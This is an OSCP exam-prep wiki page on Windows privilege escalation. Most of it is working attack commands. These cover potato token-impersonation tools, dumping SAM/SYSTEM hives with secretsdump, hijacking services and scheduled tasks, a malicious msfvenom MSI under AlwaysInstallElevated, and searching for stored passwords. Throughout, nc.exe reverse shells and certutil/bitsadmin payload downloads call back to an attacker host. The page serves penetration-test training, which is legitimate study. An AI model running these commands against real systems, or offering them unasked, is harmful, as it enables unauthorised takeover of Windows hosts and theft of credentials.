---
title: Windows Privilege Escalation
tags:
  - oscp
---

# Windows Privilege Escalation { #windows-privilege-escalation }

<div class="dfir-meta" markdown>
**Exam weight:** 10 points per Windows standalone (`proof.txt`) + AD-set hosts · **Last updated:** 2026-11-03
</div>

!!! abstract "In one sentence"
    Low-privilege user to Administrator / SYSTEM: read your token privileges first (SeImpersonate → potato), run WinPEAS, then work services, scheduled tasks, stored credentials and installer policies — kernel exploits last.

!!! tip "Practical companion"
    For command selection, output interpretation and failure diagnosis, use the [practical field guide](practical-guide.md#privesc); for Windows/AD protocol detail, use the [Impacket handbook](impacket.md).

## 1. Concept { #concept }

| Source | Why it works |
|---|---|
| **Token privileges** | Service accounts (IIS, MSSQL) hold `SeImpersonatePrivilege`; `SeBackup` / `SeRestore` / `SeManageVolume` / `SeDebug` each have a known abuse |
| **Something runs as SYSTEM that you can influence** | Service binary / path / permissions, scheduled task target, DLL search path, AlwaysInstallElevated |
| **Stored credentials** | Saved creds, PowerShell history, unattend files, config files, auto-logon, KeePass |
| **Group membership** | `Backup Operators`, `Server Operators`, `DnsAdmins`, local `Administrators` behind UAC |
| **Missing patches** | Old builds with known local exploits — last resort |

## 2. Main tools { #tools }

| Tool | Use it for | Exam status |
|---|---|---|
| **WinPEAS** | Broad automated enumeration | Allowed |
| **PrivescCheck.ps1 / SharpUp** | Second opinion on services / tasks / registry | Allowed |
| **PrintSpoofer** | SeImpersonate → SYSTEM via the print spooler named pipe | Allowed |
| **GodPotato** (and other potatoes) | SeImpersonate → SYSTEM via DCOM / RPC, works on newer builds | Allowed |
| **mimikatz** | Dump credentials once you are admin / SYSTEM | Allowed → [AD › mimikatz](active-directory.md#mimikatz) |
| **LOLBAS** | Built-in binaries for download, execution, bypasses | Allowed (reference site) |
| **msfvenom** | Replacement service binaries, DLLs, MSIs | Allowed everywhere |

## 3. Scenarios { #scenarios }

### 3.1 First five minutes — manual checks { #enumeration }

```powershell
whoami /priv                 # token privileges — read this first
whoami /groups               # groups + integrity level (Medium / High)
systeminfo                   # OS build, hotfixes, architecture
net user; net localgroup administrators
ipconfig /all                # second NIC? → pivot
netstat -ano | findstr LISTENING   # local-only services
Get-ChildItem C:\Users\ -Force; dir C:\ -Force   # odd folders: C:\backup, C:\scripts, C:\inetpub
```

**What to read:**

- `SeImpersonatePrivilege  Enabled` or `SeAssignPrimaryTokenPrivilege` → [potato](#token-privileges), now.
- `SeBackupPrivilege` → [dump SAM/SYSTEM](#sebackup).
- `Mandatory Label\Medium` while in `Administrators` → you are admin behind UAC → [UAC](#uac-kernel).
- Non-default folders in `C:\` or `Program Files` → custom software, often the intended path.

### 3.2 WinPEAS — broad sweep { #winpeas }

```powershell
iwr http://<KALI>/winPEASx64.exe -OutFile C:\Windows\Temp\wp.exe
C:\Windows\Temp\wp.exe | Tee-Object C:\Windows\Temp\wp.txt
```

**What to read:** red highlights in *Services Information* (modifiable service, unquoted path), *Applications Information* (writable install dirs), *Scheduled tasks*, *Interesting files and registry* (AutoLogon, unattend.xml, PuTTY / WinSCP sessions), *PowerShell history*, *AlwaysInstallElevated*.

If the `.exe` is blocked, try the `.bat` version or `PrivescCheck.ps1`:

```powershell
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended"
```

### 3.3 SeImpersonatePrivilege → PrintSpoofer / GodPotato { #token-privileges }

**Situation:** A shell as `iis apppool\...`, `nt service\mssqlserver`, a web shell, or `xp_cmdshell` — and `whoami /priv` shows **SeImpersonatePrivilege**.

```powershell
# PrintSpoofer — needs the Print Spooler running (common on Server 2016/2019, Win10)
.\PrintSpoofer64.exe -i -c cmd                                         # interactive
.\PrintSpoofer64.exe -c "C:\Windows\Temp\nc.exe <KALI> 443 -e cmd"      # non-interactive shell

# GodPotato — no spooler needed; pick the build matching the .NET version
.\GodPotato-NET4.exe -cmd "cmd /c whoami"
.\GodPotato-NET4.exe -cmd "C:\Windows\Temp\nc.exe <KALI> 443 -e cmd"
```

**What to read:** `nt authority\system` from `whoami`. PrintSpoofer says `[-] Operation failed` / no pipe → spooler is off → try GodPotato (or another potato: SweetPotato, JuicyPotatoNG). From a web shell the `-i` interactive mode won't work — always send a reverse shell.

**Next:** grab `proof.txt`, then **loot** (mimikatz / SAM) before moving on → [AD › Looting](active-directory.md#looting).

Defender view and the mechanism: [Token Impersonation / Potato](../../adversary/token-impersonation-potato.md) · [PrintNightmare](../../adversary/printnightmare.md).

### 3.4 SeBackupPrivilege / Backup Operators { #sebackup }

```powershell
reg save HKLM\SAM C:\Windows\Temp\sam.save
reg save HKLM\SYSTEM C:\Windows\Temp\system.save
# download both (evil-winrm: download ...), then on Kali:
impacket-secretsdump -sam sam.save -system system.save LOCAL
```

**Next:** pass the local Administrator NT hash → `evil-winrm -i $IP -u Administrator -H <NT>`. On a DC, the same privilege can copy `NTDS.dit` (via a shadow copy) → [SAM / NTDS Extraction](../../adversary/sam-ntds-extraction.md).

### 3.5 Service misconfigurations { #services }

**Situation:** WinPEAS flags a service, or you see a custom service in `C:\Program Files\<Vendor>`.

```powershell
Get-CimInstance Win32_Service | ? {$_.StartName -like '*LocalSystem*'} | select Name,State,PathName,StartMode
sc.exe qc <svc>
icacls "C:\Program Files\Vendor\svc.exe"          # (F) or (M) for Users / Everyone / you?
```

| Finding | Exploit |
|---|---|
| **Writable service binary** (`BUILTIN\Users:(M)`) | Replace it with an msfvenom exe, restart the service |
| **Weak service permissions** (you can change config) | `sc.exe config <svc> binpath= "C:\Windows\Temp\rev.exe"` |
| **Unquoted path with spaces** (`C:\Program Files\My App\svc.exe`) and a writable parent | Drop `C:\Program Files\My.exe` (or `My App\...` prefix) |
| **Writable DLL path** the service loads (ProcMon / WinPEAS) | Plant an msfvenom `-f dll` |

```powershell
# Unquoted path hunt (no wmic on new builds)
Get-CimInstance Win32_Service | ? { $_.PathName -notmatch '^"' -and $_.PathName -match ' .*\.exe' } | select Name,PathName,StartMode

# restart — needs the right to start/stop; otherwise wait for a reboot (if you have SeShutdown)
sc.exe stop <svc>; sc.exe start <svc>
Restart-Service <svc>
```

**What to read:** `Access is denied` on `sc stop` → check `StartMode` = `Auto` and whether you can `shutdown /r /t 0` (`SeShutdownPrivilege`). Ask before rebooting in a real engagement; in the exam it costs time, not points.

### 3.6 Scheduled tasks { #scheduled-tasks }

```powershell
schtasks /query /fo LIST /v | findstr /i "TaskName Run.As Task.To.Run"
Get-ScheduledTask | ? {$_.Principal.UserId -notmatch 'SYSTEM|LOCAL SERVICE|NETWORK SERVICE'} | select TaskName,TaskPath
icacls C:\scripts\cleanup.ps1
```

**What to read:** a task run as an admin user / SYSTEM whose script (`C:\scripts\*.ps1`, `.bat`) you can write. **Next:** append a reverse shell line and wait for the next run.

### 3.7 AlwaysInstallElevated { #alwaysinstallelevated }

```powershell
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

Both `0x1` → any MSI installs as SYSTEM:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALI LPORT=443 -f msi -o evil.msi
```

```powershell
msiexec /quiet /qn /i C:\Windows\Temp\evil.msi
```

### 3.8 Stored credentials { #stored-credentials }

Often faster than any exploit — look before you dig:

```powershell
cmdkey /list                                                # saved creds → runas /savecred
runas /savecred /user:CORP\admin "C:\Windows\Temp\nc.exe <KALI> 443 -e cmd"
Get-Content (Get-PSReadlineOption).HistorySavePath          # PowerShell history (every user you can read)
type C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" | findstr /i "DefaultUserName DefaultPassword"
dir C:\Windows\Panther\Unattend*.xml, C:\Windows\Panther\unattend.xml -ErrorAction SilentlyContinue
Get-ChildItem C:\Users,C:\inetpub,C:\xampp,C:\backup -Include *.config,*.xml,*.ini,*.txt,*.kdbx -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern 'password' -List
```

**What to read:** clear-text passwords, `ConvertTo-SecureString` lines, `-Credential` usage in history, base64 in unattend files, `.kdbx` → [crack](password-attacks.md#john).

**Next:** use the creds with `runas`, `evil-winrm`, RDP, or `nxc` against other hosts.

### 3.9 Built-in binaries — LOLBAS { #lolbas }

When an upload tool or PowerShell is blocked, [LOLBAS](https://lolbas-project.github.io/) lists signed Windows binaries that download or execute:

```powershell
certutil -urlcache -split -f http://<KALI>/rev.exe C:\Windows\Temp\rev.exe   # download
bitsadmin /transfer j http://<KALI>/rev.exe C:\Windows\Temp\rev.exe            # download
```

Defender view: [LOLBins](../../adversary/lolbins.md).

### 3.10 UAC and kernel { #uac-kernel }

- **Admin but medium integrity** (`whoami /groups` shows `Medium Mandatory Level`) → that's a [UAC bypass](../../adversary/uac-bypass.md), not privesc. Often simpler: if you have the admin password, log in over **evil-winrm / psexec**, which gives a high-integrity token directly.
- **Kernel / missing patch** (from `systeminfo`): compare the build and hotfixes against known local privilege-escalation CVEs; last resort, may need a revert.

## 4. Common mistakes { #mistakes }

- **Not reading `whoami /priv`** and spending an hour on WinPEAS output while SeImpersonate was there all along.
- **Wrong potato for the OS.** JuicyPotato does not work on Server 2019 / Win10 1809+; use PrintSpoofer or GodPotato.
- **32-bit shell on 64-bit Windows** — registry and `Program Files` paths differ; check `[Environment]::Is64BitProcess`.
- **Replacing a service binary you can't restart** — check start/stop rights or auto-start first.
- **Skipping other users' PowerShell history** once you can read their profile.
- **Moving on without looting.** The SYSTEM shell on MS01 is where the AD-set credential for MS02 lives.

## 5. Exam tips { #exam-tips }

- Proof screenshot: `type C:\Users\Administrator\Desktop\proof.txt`, `whoami`, `ipconfig` in one screenshot from an interactive shell (a web shell does not count — [flag rules](exam-format.md#flag-rules)).
- Keep both `PrintSpoofer64.exe` and `GodPotato-NET4.exe` (and `NET35`) in your tools folder.
- Note every file you uploaded and every service / task you changed — they go in the report's clean-up section.

## Checklist { #checklist }

- [ ] `whoami /priv` read → potato if `SeImpersonate`/`SeAssignPrimaryToken`; `SeBackup` → hives
- [ ] WinPEAS / PrivescCheck run and read
- [ ] Services checked (writable binary, unquoted path, weak perms, DLLs)
- [ ] Scheduled tasks checked
- [ ] AlwaysInstallElevated keys checked
- [ ] Stored credentials searched (cmdkey, history, registry, unattend, files)
- [ ] `systeminfo` noted for missing patches (last option)
- [ ] Host looted before moving on

## Related pages

- [Exam workflow](exam-workflow.md) · [Shells & file transfer](shells-file-transfer.md) · [Active Directory](active-directory.md)
- Defender view: [Token Impersonation / Potato](../../adversary/token-impersonation-potato.md) · [UAC Bypass](../../adversary/uac-bypass.md) · [SAM / NTDS Extraction](../../adversary/sam-ntds-extraction.md) · [LSASS Dumping](../../adversary/lsass-dumping.md) · [LOLBins](../../adversary/lolbins.md)
- Windows artefacts the same actions leave: [Registry keys](../../windows/registry-keys.md) · [Event logs](../../windows/event-logs.md) · [Prefetch](../../windows/prefetch.md)
- [Red Team: Persistence](../../redteam/persistence.md) · [Methodology & habits](methodology.md)

## References

- [LOLBAS](https://lolbas-project.github.io/)
- [PEASS-ng (WinPEAS)](https://github.com/peass-ng/PEASS-ng)
- [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) · [GodPotato](https://github.com/BeichenDream/GodPotato)
- [PrivescCheck](https://github.com/itm4n/PrivescCheck)
